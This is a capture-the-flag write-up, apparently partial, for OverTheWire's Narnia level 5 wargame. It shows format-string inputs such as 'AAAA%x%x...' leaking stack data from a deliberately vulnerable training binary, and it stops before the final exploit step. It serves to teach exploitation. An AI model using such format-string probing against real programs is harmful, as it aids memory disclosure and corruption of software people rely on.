#Narnia5

narnia.labs.overthewire.org

**Username:** narnia5
**Password:** see [narnia4](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Naria4)
**Description:**  
> This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.  

##Write-up

> Just running the program provides us a little bit of a hint.
>
>```
# ./narnia5
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [] (0)
i = 1 (0xffb60dbc)
>```
>
> 
>```
# ./narnia5 %x%x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [f76b9960ffb1f4e6] (16)
i = 1 (0xffb1f50c)
# ./narnia5 AAAA%x%x%x%x%x%x%x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAf7650960ffbff5f6f75fe315ffbff5f7414141413536376630363930] (60)
i = 1 (0xffbff61c)
>```
